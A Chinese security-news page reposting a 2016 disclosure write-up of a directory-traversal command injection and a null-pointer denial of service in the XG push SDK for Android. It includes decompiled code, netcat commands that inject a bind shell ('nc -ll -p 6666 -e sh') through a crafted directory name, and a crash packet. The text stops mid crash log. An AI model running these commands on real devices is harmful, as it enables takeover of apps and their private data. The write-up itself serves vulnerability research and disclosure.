<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】一个目录穿越引发的注入及后续——XG SDK漏洞 回顾与思考 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="XG SDK,漏洞,Android"/>
    
        <meta name="description" content="XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】一个目录穿越引发的注入及后续——XG SDK漏洞 回顾与思考</h2>
                <div class="article-msg">
                    <span class="time">2016-12-13 14:08:59</span>
                                        <span class="read">阅读：9674次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3286"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3286" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://drops.wiki/index.php/2016/12/08/xgsdk/"
                             target="_blank">来源： drops.wiki-小荷才露尖尖角</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><img src="http://p7.qhimg.com/t01ce6be0d1c79f3c45.png" title="t01ce6be0d1c79f3c45.png" alt="http://p7.qhimg.com/t01ce6be0d1c79f3c45.png"/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x00 简介</span></strong></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">XG SDK是一个流行的Android app推送SDK，有不少流行Android app均在使用，本文分析的版本主要针对100001_work_weixin_1.0.0.apk所使用的版本。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">漏洞最初在2016年4月份的时候提交给了某云网站，厂商已经确认，但由于网站持续“升级”的缘故，不太可能公开细节了。后续漏洞也已经提交给了TSRC，时至现在，相关漏洞均已经完全修复，漏洞已经不影响使用该SDK的app了，因此本文决定对相关技术细节予以分享，并补充有关该漏洞后续的一些研究。</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x01 漏洞分析</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">XG&nbsp;SDK会周期性地启动一个libtpnsWatchdog.so的可执行文件，作为看门狗保活应用，并随机在55000~56000端口监听任意地址。</span></p><pre class="brush:bash;toolbar:false">&nbsp;public&nbsp;static&nbsp;int&nbsp;getRandomPort()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;XGWatchdog.getRandomInt(1000)&nbsp;+&nbsp;55000;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在我们实验手机上的监听端口为55362，启动进程为com.tencent.wework&nbsp;lib目录下的libtpnsWatchdog.so</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01ece318eb842e8a56.png" title="t01ece318eb842e8a56.png" alt="http://p1.qhimg.com/t01ece318eb842e8a56.png"/></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01c7305bf31d6aa29f.png" title="t01c7305bf31d6aa29f.png" alt="http://p3.qhimg.com/t01c7305bf31d6aa29f.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">经过逆向分析，可发现这个开放端口支持一系列的文本命令，包括：</span></p><ul style="box-sizing: inherit; border: 0px; font-family: inherit; font-style: inherit; font-weight: inherit; margin-bottom: 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; list-style-position: initial; list-style-image: initial;" class=" list-paddingleft-2"><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">“ver:”，获取版本号</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">“debug:1”，打开调试</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">“xgapplist:”,获取或设置使用xg sdk的app</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">“tme:xxxx”，设置周期性启动服务的等待时间</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">“exit2:”，退出</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">例如，发送debug:1，可获得当前手机上使用XG的app列表及当前启动服务的等待时间等信息，可见，手机上有四个app使用了该推送sdk.</span></p></li><li><pre class="brush:bash;toolbar:false">echo&nbsp;-n&nbsp;“debug:1”&nbsp;&nbsp;|&nbsp;nc&nbsp;192.168.8.187&nbsp;5536</pre></li></ul><p style="text-align: center; text-indent: 0em;"><img src="http://p0.qhimg.com/t018c2300c15b9506e6.png" title="t018c2300c15b9506e6.png" alt="http://p0.qhimg.com/t018c2300c15b9506e6.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">当发送xgapplist:xxx，则可以设置当前使用xg sdk的app。其中xxx的形式为 &lt;packagename1&gt;,&lt;accid1&gt;;&lt;packagename2&gt;,&lt;accid2&gt;…</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">接下来会通过fopen打开/data/data/&lt;packagename&gt;/lib目录来判断指定packagename的目录是否存在，如果存在，则会在后续使用该packagename，否则提示找不到该package。</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p6.qhimg.com/t01ca9644190082c3b9.png" title="t01ca9644190082c3b9.png" alt="http://p6.qhimg.com/t01ca9644190082c3b9.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">然后，程序会调用system通过am命令启动对应包内的XG组件，这里就使用了上面检查过的packagename.</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t0111c1cfbd7e03c9d3.png" title="t0111c1cfbd7e03c9d3.png" alt="http://p5.qhimg.com/t0111c1cfbd7e03c9d3.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">注意，上述两个system函数中的参数没有进行任何过滤。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">那么，我们结合上述两张图来看，<strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px; color: rgb(227, 108, 9);">如果恶意app满足：</span></strong></span></p><ol style="box-sizing: inherit; border: 0px; font-family: inherit; font-style: inherit; font-weight: inherit; margin-bottom: 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; list-style-position: initial; list-style-image: initial;" class=" list-paddingleft-2"><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">1. 能够设置一个存在且被xg&nbsp;sdk可以访问的目录，</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">2. 目录名中嵌入执行的代码</span></p></li><li><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">那么就可以实现命令注入。对于条件1，可以通过../../../../路径穿越的形式跳转到恶意app可控的目录；而对于条件2，则可以利用shell特性，在可控目录下建立猥琐的“ || &lt;command&gt; #”目录实现。</span></p></li><li><p><br/></p></li><li><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 18px;">0x02 &nbsp;漏洞利用</span></strong></p><hr/><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"> &nbsp; &nbsp; &nbsp;（1）模拟恶意app在/sdcard目录建立一个特殊（猥琐）的目录名，除了“/“字符外，其他字符均可用。</span></p></li></ol><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t0111c1cfbd7e03c9d3.png" title="t0111c1cfbd7e03c9d3.png" alt="http://p5.qhimg.com/t0111c1cfbd7e03c9d3.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">于是我们有了了” &amp;&amp; nc -ll -p 6666 -e sh #”的目录，并在目录下存在子目录lib</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">（2）通过xgapplist命令设置推送app</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">如图，发送命令，</span></p><pre class="brush:bash;toolbar:false">echo&nbsp;-n&nbsp;“xgapplist:com.tencent.wework/../../../../../../sdcard/&nbsp;&amp;&amp;&nbsp;nc&nbsp;-ll&nbsp;-p&nbsp;6666&nbsp;-e&nbsp;sh&nbsp;#,2100078991;”&nbsp;|&nbsp;nc&nbsp;-vv&nbsp;192.168.8.187&nbsp;55362</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">观察logcat可以发现设置成功。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01aede864132faecb8.png" title="t01aede864132faecb8.png" alt="http://p7.qhimg.com/t01aede864132faecb8.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-align: left; text-indent: 2em;">（3）通过tme命令，使am命令周期性进行，进而触发后面的system函数，执行我们的反弹shell命令</span></p><pre class="brush:bash;toolbar:false">echo&nbsp;-n&nbsp;“tme:12345”&nbsp;|&nbsp;nc&nbsp;-v&nbsp;192.168.8.187&nbsp;55362</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">稍等片刻，观察logcat的打印信息后，可以尝试连接shell，成功连接</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p7.qhimg.com/t019e4a2d8773c75b85.png" title="t019e4a2d8773c75b85.png" alt="http://p7.qhimg.com/t019e4a2d8773c75b85.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">u0_a113用户正好就是com.tencent.wework</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p2.qhimg.com/t0172b56b68bdce9dd4.png" title="t0172b56b68bdce9dd4.png" alt="http://p2.qhimg.com/t0172b56b68bdce9dd4.png"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">下面就可以以com.tencent.wework的权限做任何事情了，比如访问私有目录、打开保护的activity、发广播等等。</span></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x03 漏洞是否能够远程</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">因为当时漏洞取名带有“远程”二字不够严谨，引发了厂商的争议。的确，从这个漏洞的成因来看，主要还是本地恶意app通过污染目录名，结合XG开放的端口，完成本地提权。但经瘦蛟舞的指点，可以考虑向受害者发送包含污染目录名的zip包（或者通过浏览器下载解压至/sdcard），然后结合XG监听端口的地址为任意地址，远程传入命令，进而实现远程命令执行，这种远程攻击相对难度较大，因为开放的端口为随机端口，攻击者也需要社工欺骗受害者接收zip包.</span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"><br/></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x04 空指针解引用远程拒绝服务</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">当向XG监听端口发送xgapplist命令时，libtpnsWatchdog.so对后面的packagename和accid进行处理，但并没有检查“，”或“；“分割的字符串为空的情况，导致后面atoll函数去访问0地址的内存，造成空指针解引用crash。见如下代码：</span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;"></span></p><pre class="brush:bash;toolbar:false">v1&nbsp;=&nbsp;a1;
&nbsp;&nbsp;if&nbsp;(&nbsp;a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;j_j_memset(xgapplist,&nbsp;0,&nbsp;0x200u);
&nbsp;&nbsp;&nbsp;&nbsp;first_app&nbsp;=&nbsp;j_j_strtok(v1,&nbsp;“;”);
&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;first_app;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_of_applist&nbsp;=&nbsp;v3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v2&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;j_j_strlen(v2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v6&nbsp;=&nbsp;v5&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;(void&nbsp;*)j_operator&nbsp;new[](v5&nbsp;+&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xgapplist[len_of_applist]&nbsp;=&nbsp;v7;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j_j_memcpy(v7,&nbsp;v2,&nbsp;v6);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;j_j_strtok(0,&nbsp;“;”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;len_of_applist&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;len_of_applist;&nbsp;++i&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v8&nbsp;=&nbsp;(char&nbsp;*)xgapplist[i];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v8&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;package&nbsp;=&nbsp;j_j_strtok(v8,&nbsp;“,”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;accid&nbsp;=&nbsp;j_j_strtok(0,&nbsp;“,”);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v11&nbsp;=&nbsp;accid;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;j_j_atoll(accid);&nbsp;//null&nbsp;pointer&nbsp;dereference&nbsp;crash&nbsp;!!!!
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v27&nbsp;=&nbsp;v12;</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">向55362端口发送一个最简单的数据包，</span></p><pre class="brush:bash;toolbar:false;"><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">echo -n &quot;xgapplist:A&quot; | nc -v 192.168.8.169 55362<br style="text-align: left;"/></span></p></pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">使用logcat可观察到Oops：</span></p><pre class="brush:bash;toolbar:false;"><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">I/DEBUG &nbsp; ( &nbsp;243): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): Build fingerprint: &#39;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&#39;<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): Revision: &#39;11&#39;<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): pid: 11774, tid: 11774, name: xg_watchdog &nbsp;&gt;&gt;&gt; /data/data/com.tencent.wework/lib/libtpnsWatchdog.so &lt;&lt;&lt;<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; r0 4008a2d8 &nbsp;r1 40083d28 &nbsp;r2 ffffff78 &nbsp;r3 00000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; r4 400165c6 &nbsp;r5 00000002 &nbsp;r6 0000000a &nbsp;r7 00000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; r8 400120d9 &nbsp;r9 00000000 &nbsp;sl 00000000 &nbsp;fp bed838ec<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; ip 40018f68 &nbsp;sp bed7f6e8 &nbsp;lr 400125e5 &nbsp;pc 4006aab0 &nbsp;cpsr 000f0030<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d0 &nbsp;0000000000000000 &nbsp;d1 &nbsp;0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d2 &nbsp;0000000000000000 &nbsp;d3 &nbsp;0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d4 &nbsp;0000000000000000 &nbsp;d5 &nbsp;0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d6 &nbsp;0000000000000000 &nbsp;d7 &nbsp;0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d8 &nbsp;0000000000000000 &nbsp;d9 &nbsp;0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d10 0000000000000000 &nbsp;d11 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d12 0000000000000000 &nbsp;d13 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d14 0000000000000000 &nbsp;d15 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d16 41db6820b9bcac08 &nbsp;d17 3f50624dd2f1a9fc<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d18 419908a090000000 &nbsp;d19 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d20 0000000000000000 &nbsp;d21 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): &nbsp; &nbsp; d22 0000000000000000 &nbsp;d23 0000000000000000<br style="text-align: left;"/>I/DEBUG &nbsp; ( &nbsp;243): 